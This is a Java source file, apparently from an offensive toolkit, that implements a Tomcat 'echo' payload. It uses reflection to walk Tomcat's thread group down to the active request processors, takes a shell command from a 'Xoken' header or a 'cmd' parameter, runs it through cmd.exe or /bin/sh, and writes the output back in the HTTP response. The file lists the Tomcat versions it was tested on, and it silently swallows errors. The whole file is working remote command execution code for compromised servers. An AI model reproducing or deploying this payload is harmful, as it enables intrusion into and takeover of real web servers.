package com.demo.echo;

import java.io.InputStream;
import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 *
 * use https://github.com/c0ny1/java-object-searcher
 * TargetObject = {org.apache.tomcat.util.threads.TaskThread}
 * ---> group = {java.lang.ThreadGroup}
 * ---> threads = {class [Ljava.lang.Thread;}
 * ---> [13] = {java.lang.Thread}
 * ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
 * ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
 * ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
 * ---> global = {org.apache.coyote.RequestGroupInfo}
 *
 * Version test
 * 6.0.53
 * 7.0.59、7.0.109
 * 8.0.53、8.5.82
 * 9.0.65
 */
public class TomcatEcho {
    private static String HEADER = "Xoken";
    private static String PARAM = "cmd";

    public TomcatEcho() {
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field field = threadGroup.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(threadGroup);

            for (int i = 0; i < threads.length; i++) {
                // Thread 筛选
                Thread thread = threads[i];
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;

                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    Object response = req.getClass().getMethod("getResponse").invoke(req);
                    Object header = req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
                    Object parameters = getFieldValue(req, "parameters");

                    String result = null;
                    if (header != null) {
                        result = exec((String) header);
                    } else if (parameters != null) {
                        String param = parameters.getClass().getMethod("getParameter", String.class).invoke(parameters, PARAM).toString();
                        result = exec(param);
                    }

                    // doWrite
                    response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
                    try {
                        response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
                    } catch (NoSuchMethodException e) {
                        Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                        Object byteChunk = clazz.newInstance();
                        clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
                        response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
                    }
                    return;
                }

            }
        } catch (Exception e) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
